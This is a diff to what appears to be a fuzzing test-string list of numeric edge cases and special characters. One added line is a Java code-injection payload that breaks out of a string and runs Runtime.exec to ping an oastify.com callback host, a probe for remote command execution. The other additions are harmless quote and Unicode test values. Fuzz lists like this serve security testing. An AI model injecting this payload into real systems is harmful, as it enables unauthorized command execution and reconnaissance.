@@ -43,6 +43,7 @@ $1.00
 +0.0
 0.00
 0..0
+1\u0022;Runtime.getRuntime().exec(\u0022ping r2utqe16c7ykbh2vfgz8wudi59b0zzno.oastify.com\u0022);//
 .
 0.0.0
 0,00
@@ -84,7 +85,9 @@ INF
 08
 09
 2.2250738585072011e-308
-
+'''
+"""
+\u0022\u2067asd
 ,./;'[]\-=
 <>?:"{}|_+
 !@
